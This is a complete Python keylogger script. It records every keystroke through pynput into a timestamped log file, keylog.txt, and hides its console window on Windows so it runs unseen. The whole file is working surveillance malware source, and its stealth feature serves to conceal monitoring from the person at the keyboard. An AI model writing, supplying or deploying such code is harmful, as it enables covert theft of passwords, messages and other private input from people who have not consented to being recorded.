import logging
import os
import sys
import time
from pynput import keyboard

# Set up logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f"{key.char}")
        else:
            logging.info(f" [{key}] ")  # Special keys like Shift, Enter, etc.
    except Exception as e:
        logging.error(f"Error: {e}")

# Hide console window (Windows only)
def hide_console():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.FreeConsole()

# Start keylogger
hide_console()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
